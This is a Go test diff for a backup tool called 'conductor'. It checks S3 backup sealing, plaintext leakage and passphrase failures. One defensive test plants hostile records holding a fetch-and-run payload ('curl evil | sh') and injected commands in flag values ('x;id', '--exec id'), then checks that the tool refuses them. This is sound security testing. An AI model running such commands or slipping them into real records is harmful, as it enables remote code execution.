@@ -1,7 +1,10 @@
 package main
 
 import (
+	"bytes"
 	"context"
+	"encoding/json"
+	"errors"
 	"io"
 	"net/http"
 	"net/http/httptest"
@@ -11,8 +14,10 @@ import (
 	"testing"
 	"time"
 
-	"github.com/adamburan/conductor/internal/backup"
-	"github.com/adamburan/conductor/internal/localstate"
+	"github.com/aburan28/conductor/internal/awscreds"
+	"github.com/aburan28/conductor/internal/backup"
+	"github.com/aburan28/conductor/internal/checkpoint"
+	"github.com/aburan28/conductor/internal/localstate"
 )
 
 // inMemoryS3 is a tiny path-style S3 for CLI-level backup tests.
@@ -101,5 +106,205 @@ func TestBackupPushPullRoundTrip(t *testing.T) {
 	again, err := pullRecords(ctx, store, false)
 	if err != nil || again != 0 {
 		t.Fatalf("second pull = %d, %v; want 0 (no clobber)", again, err)
+	}
+}
+
+func memoryBackup(t *testing.T) (*backup.Store, *inMemoryS3) {
+	t.Helper()
+	mem := &inMemoryS3{}
+	srv := httptest.NewServer(mem)
+	t.Cleanup(srv.Close)
+	u, _ := url.Parse(srv.URL)
+	store, err := backup.Open(backup.Config{
+		S3Config: backup.S3Config{Bucket: "bucket", Region: "us-east-1", AccessKey: "AK", SecretKey: "SK",
+			Endpoint: u.Scheme + "://" + u.Host, PathStyle: true, Insecure: true},
+		Prefix: "conductor", Machine: "host-a",
+	})
+	if err != nil {
+		t.Fatal(err)
+	}
+	return store, mem
+}
+
+// With a passphrase configured, the records leave sealed and come back only with it.
+func TestBackupIsSealedWithTheCheckpointKey(t *testing.T) {
+	store, mem := memoryBackup(t)
+	t.Setenv("CONDUCTOR_STATE_DIR", t.TempDir())
+	t.Setenv("CONDUCTOR_CHECKPOINT_KEY", "correct horse")
+	ctx := context.Background()
+
+	if err := localstate.KeepForResume(localstate.Record{
+		ID: "p1", Harness: "claude", Cwd: "/home/op/secret-project", StartedAt: time.Now(),
+	}); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := pushRecords(ctx, store, time.Now().UTC()); err != nil {
+		t.Fatal(err)
+	}
+	for key, body := range mem.obj {
+		if !checkpoint.IsSealed(body) || strings.Contains(string(body), "secret-project") {
+			t.Errorf("%s was uploaded in the clear", key)
+		}
+	}
+
+	t.Setenv("CONDUCTOR_STATE_DIR", t.TempDir())
+	t.Setenv("CONDUCTOR_CHECKPOINT_KEY", "wrong")
+	if _, err := pullRecords(ctx, store, false); err == nil {
+		t.Error("a sealed backup opened with the wrong passphrase")
+	}
+	t.Setenv("CONDUCTOR_CHECKPOINT_KEY", "correct horse")
+	if n, err := pullRecords(ctx, store, false); err != nil || n != 1 {
+		t.Fatalf("pull = %d, %v; want 1", n, err)
+	}
+}
+
+// Anyone who can write the bucket controls a plaintext backup. What they write must not
+// become a command `conductor resume` runs: the argv is dropped, the resume invocation is
+// recomputed, unknown harnesses and odd wrap flags are refused, and the record is marked
+// as restored so resume asks first.
+func TestPulledRecordsCannotCarryACommand(t *testing.T) {
+	store, mem := memoryBackup(t)
+	t.Setenv("CONDUCTOR_STATE_DIR", t.TempDir())
+	t.Setenv("CONDUCTOR_CHECKPOINT_KEY", "")
+
+	planted, _ := json.Marshal(backupManifest{Machine: "host-a", Records: []localstate.Record{
+		{ID: "evil1", Harness: "claude", Cwd: "/tmp", Command: "/bin/sh",
+			Args: []string{"-c", "curl evil | sh"}, ResumeArgs: []string{"-c", "curl evil | sh"},
+			PID: 1, WrapPID: 1},
+		{ID: "evil2", Harness: "sh", ResumeArgs: []string{"-c", "id"}},
+		{ID: "evil3", Harness: "codex", Wrapped: true, WrapFlags: []string{"--model", "x;id"}},
+		{ID: "evil4", Harness: "codex", Wrapped: true, WrapFlags: []string{"--exec", "id"}},
+	}})
+	mem.mu.Lock()
+	mem.obj = map[string][]byte{"conductor/machines/host-a/sessions.json": planted}
+	mem.mu.Unlock()
+
+	n, err := pullRecords(context.Background(), store, false)
+	if err != nil || n != 1 {
+		t.Fatalf("pull = %d, %v; want only the claude record restored", n, err)
+	}
+	rec, ok := localstate.Get("evil1")
+	if !ok {
+		t.Fatal("the claude record was not restored")
+	}
+	if rec.RestoredFrom != "host-a" {
+		t.Errorf("restored record is not marked as restored: %+v", rec)
+	}
+	if rec.PID != 0 || rec.WrapPID != 0 {
+		t.Error("another machine's process ids survived the restore")
+	}
+	argv, _ := relaunchArgv(rec, "/usr/local/bin/conductor")
+	if strings.Join(argv, " ") != "claude --continue" {
+		t.Errorf("restored record relaunches %q, want only the harness's own resume invocation", argv)
+	}
+	if ok, _ := confirmRestored(rec, argv); ok {
+		t.Error("a restored record was run without confirmation off a terminal")
+	}
+
+	// With a passphrase configured, a plaintext manifest is refused outright: it is either an
+	// old backup or one somebody replaced to strip the seal.
+	t.Setenv("CONDUCTOR_CHECKPOINT_KEY", "k")
+	if _, err := pullRecords(context.Background(), store, true); !errors.Is(err, errUnsealedBackup) {
+		t.Errorf("plaintext pull with a key configured = %v, want errUnsealedBackup", err)
+	}
+}
+
+// Only an index entry sits beside a sealed checkpoint in the bucket. The manifest names the
+// conversation, the note, and the working directory, which are content.
+func TestCheckpointPushLeavesNoManifestInTheClear(t *testing.T) {
+	store, mem := memoryBackup(t)
+	t.Setenv("CONDUCTOR_STATE_DIR", t.TempDir())
+
+	var b checkpoint.Builder
+	if err := b.Add(checkpoint.ContinuationPath, []byte("# continue\n")); err != nil {
+		t.Fatal(err)
+	}
+	m := checkpoint.Manifest{Schema: checkpoint.Schema, ID: checkpoint.NewID(time.Now()),
+		CreatedAt: time.Now().UTC(), Harness: "claude", SessionID: "s-1",
+		Title: "Fix the acquisition memo", Note: "waiting on legal", Cwd: "/home/op/secret-deal",
+		Machine: "ops-laptop"}
+	var archive bytes.Buffer
+	if err := b.Seal(&m, &archive); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := checkpoint.Put(m, archive.Bytes()); err != nil {
+		t.Fatal(err)
+	}
+	if err := pushCheckpoint(context.Background(), store, m, "passphrase"); err != nil {
+		t.Fatal(err)
+	}
+
+	index, ok := mem.obj["conductor/checkpoints/"+m.ID+".json"]
+	if !ok {
+		t.Fatalf("no index entry uploaded; have %v", mem.obj)
+	}
+	for _, secret := range []string{"acquisition", "legal", "secret-deal", "ops-laptop", "s-1"} {
+		if strings.Contains(string(index), secret) {
+			t.Errorf("the clear-text object beside the sealed bundle carries %q:\n%s", secret, index)
+		}
+	}
+	var entry checkpoint.IndexEntry
+	if err := json.Unmarshal(index, &entry); err != nil || entry.ID != m.ID || !entry.Sealed {
+		t.Errorf("index entry = %+v (%v)", entry, err)
+	}
+}
+
+// A seal passphrase that exists but cannot be read must stop both directions. Nothing may be
+// uploaded in the clear, the Keychain read runs under the caller's context so a shutdown bound
+// covers it, and a sealed backup that cannot be unsealed reports the Keychain read error.
+func TestBackupStopsWhenTheSealPassphraseCannotBeRead(t *testing.T) {
+	store, mem := memoryBackup(t)
+	t.Setenv("CONDUCTOR_STATE_DIR", t.TempDir())
+	type ctxKey struct{}
+	var sawCallerCtx bool
+	old := sealEnv
+	t.Cleanup(func() { sealEnv = old })
+	unreadable := func(_ context.Context, _ []byte, _ string, _ ...string) ([]byte, error) {
+		return nil, errors.New("exit status 128: User interaction is not allowed.")
+	}
+	sealEnv = func() awscreds.Env {
+		return awscreds.Env{GOOS: "darwin", Getenv: func(string) string { return "" },
+			Command: func(ctx context.Context, in []byte, name string, args ...string) ([]byte, error) {
+				sawCallerCtx = ctx.Value(ctxKey{}) == "caller"
+				return unreadable(ctx, in, name, args...)
+			}}
+	}
+	ctx := context.WithValue(context.Background(), ctxKey{}, "caller")
+
+	if err := localstate.KeepForResume(localstate.Record{
+		ID: "p1", Harness: "claude", Cwd: "/home/op/secret-project", StartedAt: time.Now(),
+	}); err != nil {
+		t.Fatal(err)
+	}
+	_, err := pushRecords(ctx, store, time.Now().UTC())
+	if err == nil || !strings.Contains(err.Error(), "Keychain") {
+		t.Fatalf("push without a readable seal passphrase = %v; want a Keychain error", err)
+	}
+	if len(mem.obj) != 0 {
+		t.Errorf("%d object(s) were uploaded without the seal", len(mem.obj))
+	}
+	if !sawCallerCtx {
+		t.Error("the Keychain read did not run under the caller's context")
+	}
+
+	// A backup sealed with a passphrase that is later unreadable: the pull reports the Keychain
+	// read, not a suggestion that the passphrase was never set.
+	sealEnv = func() awscreds.Env {
+		return awscreds.Env{GOOS: "linux", Getenv: func(k string) string {
+			if k == "CONDUCTOR_CHECKPOINT_KEY" {
+				return "correct horse"
+			}
+			return ""
+		}}
+	}
+	if _, err := pushRecords(context.Background(), store, time.Now().UTC()); err != nil {
+		t.Fatal(err)
+	}
+	sealEnv = func() awscreds.Env {
+		return awscreds.Env{GOOS: "darwin", Getenv: func(string) string { return "" }, Command: unreadable}
+	}
+	_, err = pullRecords(context.Background(), store, false)
+	if err == nil || !strings.Contains(err.Error(), "Keychain") || strings.Contains(err.Error(), "set CONDUCTOR_CHECKPOINT_KEY") {
+		t.Fatalf("pull with an unreadable passphrase = %v; want the Keychain read error", err)
 	}
 }
